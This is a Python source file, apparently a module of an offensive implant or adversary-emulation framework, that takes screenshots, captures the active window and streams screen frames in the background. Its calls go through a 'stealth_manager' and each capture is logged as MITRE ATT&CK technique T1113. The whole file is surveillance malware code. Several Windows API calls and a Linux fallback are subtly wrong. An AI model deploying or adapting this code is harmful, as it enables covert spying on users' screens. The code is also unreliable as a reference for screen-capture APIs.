# Screen Capture Module
# Implements screenshot and screen stream capabilities

import os
import sys
import time
import base64
import io
import threading
import queue
from datetime import datetime
from config import DEBUG_MODE, MITRE_TECHNIQUES
from core.stealth import stealth_manager

class ScreenCapture:
    """Handles screenshot and screen stream capture"""
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.capture_queue = queue.Queue()
        self.is_streaming = False
        self.stream_thread = None
        self.frame_buffer = []
        self.max_buffer_size = 100
        self.quality = 70  # JPEG quality
        
    def take_screenshot(self, output_path=None):
        """Capture a single screenshot"""
        screenshot_data = {
            'timestamp': datetime.now().isoformat(),
            'image_data': None,
            'dimensions': None,
            'format': 'jpeg'
        }
        
        try:
            if self.is_windows:
                image_data = self._capture_windows()
            else:
                image_data = self._capture_linux()
            
            if image_data:
                screenshot_data['image_data'] = base64.b64encode(image_data).decode()
                screenshot_data['dimensions'] = self._get_image_dimensions(image_data)
                
                if output_path:
                    self._save_screenshot(image_data, output_path)
                
                self._log_technique('T1113', True, {
                    'dimensions': screenshot_data['dimensions']
                })
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Screenshot capture failed: {e}")
                )
            self._log_technique('T1113', False, {'error': str(e)})
        
        return screenshot_data
    
    def _capture_windows(self):
        """Capture screenshot on Windows"""
        try:
            import win32gui
            import win32con
            import win32api
            from PIL import Image, ImageGrab
            
            # Get primary monitor dimensions
            def get_monitor_dimensions():
                monitor = win32api.EnumDisplayMonitors(None, None)
                dimensions = []
                for h_monitor, _, rect in monitor:
                    dimensions.append({
                        'left': rect[0],
                        'top': rect[1],
                        'right': rect[2],
                        'bottom': rect[3]
                    })
                return dimensions
            
            monitors = get_monitor_dimensions()
            
            if not monitors:
                return None
            
            # Capture the primary monitor (first in list)
            monitor = monitors[0]
            
            # Calculate capture region
            left = monitor['left']
            top = monitor['top']
            right = monitor['right']
            bottom = monitor['bottom']
            
            # Capture screenshot
            img = ImageGrab.grab(bbox=(left, top, right, bottom))
            
            # Convert to JPEG bytes
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=self.quality)
            buffer.seek(0)
            
            return buffer.read()
            
        except ImportError:
            # Fallback using Windows API directly
            return self._capture_windows_api()
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Windows screenshot failed: {e}")
                )
            return None
    
    def _capture_windows_api(self):
        """Fallback Windows screenshot using GDI API"""
        try:
            import ctypes
            from ctypes import wintypes
            
            # Get screen dimensions
            user32 = ctypes.windll.user32
            user32.SetProcessDPIAware()
            
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)
            
            # Create DC
            dc = user32.GetDC(None)
            if not dc:
                return None
            
            # Create compatible DC
            memdc = user32.CreateCompatibleDC(dc)
            if not memdc:
                user32.ReleaseDC(None, dc)
                return None
            
            # Create bitmap
            bitmap = user32.CreateCompatibleBitmap(dc, width, height)
            if not bitmap:
                user32.DeleteDC(memdc)
                user32.ReleaseDC(None, dc)
                return None
            
            # Select bitmap into DC
            user32.SelectObject(memdc, bitmap)
            
            # BitBlt
            ctypes.windll.gdi32.BitBlt(
                memdc, 0, 0, width, height,
                dc, 0, 0, 0x00CC0020  # SRCCOPY
            )
            
            # Get bitmap data
            bitmap_info = wintypes.BITMAPINFO()
            bitmap_info.bmiHeader.biSize = ctypes.sizeof(wintypes.BITMAPINFOHEADER)
            bitmap_info.bmiHeader.biWidth = width
            bitmap_info.bmiHeader.biHeight = -height  # Top-down
            bitmap_info.bmiHeader.biPlanes = 1
            bitmap_info.bmiHeader.biBitCount = 24
            bitmap_info.bmiHeader.biCompression = 0
            
            buffer = ctypes.create_string_buffer(width * height * 3 + 1024)
            ctypes.windll.gdi32.GetDIBits(
                memdc, bitmap, 0, height, buffer, ctypes.byref(bitmap_info), 0
            )
            
            # Cleanup
            user32.DeleteObject(bitmap)
            user32.DeleteDC(memdc)
            user32.ReleaseDC(None, dc)
            
            # Convert to JPEG using PIL
            from PIL import Image
            
            img = Image.frombuffer(
                'RGB', (width, height), buffer, 'raw', 'BGR', 0, 0
            )
            
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=self.quality)
            buffer.seek(0)
            
            return buffer.read()
            
        except Exception:
            return None
    
    def _capture_linux(self):
        """Capture screenshot on Linux"""
        try:
            import Xlib.display
            import Xlib.ext.xtest
            
            display = Xlib.display.Display()
            root = display.screen().root
            
            width = root.get_geometry().width
            height = root.get_geometry().height
            
            # Get image data
            raw = root.get_image(0, 0, width, height, Xlib.X.ZPixmap, 0xFFFFFFFF)
            
            # Convert to PIL Image
            from PIL import Image
            
            img = Image.frombytes(
                'RGB', (width, height), raw.data, 'raw', 'RGBX', 0, 0
            )
            
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=self.quality)
            buffer.seek(0)
            
            return buffer.read()
            
        except ImportError:
            # Fallback using scrot
            return self._capture_linux_scrot()
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Linux screenshot failed: {e}")
                )
            return None
    
    def _capture_linux_scrot(self):
        """Fallback Linux screenshot using scrot"""
        try:
            import subprocess
            
            temp_file = "/tmp/screenshot_temp.jpg"
            
            result = subprocess.run(
                ['scrot', '-q', str(self.quality), temp_file],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
            
            if result.returncode == 0 and os.path.exists(temp_file):
                with open(temp_file, 'rb') as f:
                    data = f.read()
                os.remove(temp_file)
                return data
            
            return None
            
        except Exception:
            return None
    
    def _get_image_dimensions(self, image_data):
        """Get dimensions of captured image"""
        try:
            from PIL import Image
            
            img = Image.open(io.BytesIO(image_data))
            return {
                'width': img.width,
                'height': img.height
            }
        except Exception:
            return None
    
    def _save_screenshot(self, image_data, output_path):
        """Save screenshot to file"""
        try:
            with open(output_path, 'wb') as f:
                f.write(image_data)
            
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Screenshot saved to {output_path}")
                )
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Screenshot save failed: {e}")
                )
    
    def start_screen_stream(self, interval=5.0, max_frames=None):
        """Start continuous screen streaming"""
        self.is_streaming = True
        self.stream_thread = threading.Thread(
            target=self._stream_loop,
            args=(interval, max_frames),
            daemon=True
        )
        self.stream_thread.start()
        
        if DEBUG_MODE:
            stealth_manager.safe_execute(
                lambda: print(f"Screen stream started with {interval}s interval")
            )
    
    def _stream_loop(self, interval, max_frames):
        """Screen streaming loop"""
        frame_count = 0
        
        while self.is_streaming:
            try:
                if max_frames and frame_count >= max_frames:
                    break
                
                # Capture frame
                frame = self.take_screenshot()
                if frame and frame['image_data']:
                    self.frame_buffer.append(frame)
                    
                    # Limit buffer size
                    while len(self.frame_buffer) > self.max_buffer_size:
                        self.frame_buffer.pop(0)
                
                # Wait for next capture
                time.sleep(interval)
                frame_count += 1
                
            except Exception as e:
                if DEBUG_MODE:
                    stealth_manager.safe_execute(
                        lambda: print(f"Stream loop error: {e}")
                    )
                time.sleep(interval)
    
    def stop_screen_stream(self):
        """Stop screen streaming"""
        self.is_streaming = False
        
        if self.stream_thread:
            self.stream_thread.join(timeout=2)
        
        if DEBUG_MODE:
            stealth_manager.safe_execute(
                lambda: print("Screen stream stopped")
            )
    
    def get_stream_frame(self):
        """Get latest frame from stream buffer"""
        if self.frame_buffer:
            return self.frame_buffer[-1]
        return None
    
    def get_all_frames(self):
        """Get all frames from stream buffer"""
        frames = self.frame_buffer.copy()
        self.frame_buffer.clear()
        return frames
    
    def capture_active_window(self, output_path=None):
        """Capture only the active window"""
        try:
            if not self.is_windows:
                return None
            
            import win32gui
            import win32con
            from PIL import Image, ImageGrab
            
            # Get active window
            hwnd = win32gui.GetForegroundWindow()
            
            if not hwnd:
                return None
            
            # Get window dimensions
            left, top, right, bottom = win32gui.GetWindowRect(hwnd)
            width = right - left
            height = bottom - top
            
            if width <= 0 or height <= 0:
                return None
            
            # Capture window
            img = ImageGrab.grab(bbox=(left, top, right, bottom))
            
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=self.quality)
            buffer.seek(0)
            
            screenshot_data = {
                'timestamp': datetime.now().isoformat(),
                'image_data': base64.b64encode(buffer.read()).decode(),
                'dimensions': {'width': width, 'height': height},
                'format': 'jpeg',
                'type': 'active_window'
            }
            
            if output_path:
                with open(output_path, 'wb') as f:
                    f.write(buffer.getvalue())
            
            return screenshot_data
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Active window capture failed: {e}")
                )
            return None
    
    def _log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            stealth_manager.safe_execute(
                lambda: print(f"Technique {technique_id} ({technique_name}): {'Success' if success else 'Failed'}")
            )

# Global screen capture instance
screen_capture = ScreenCapture()
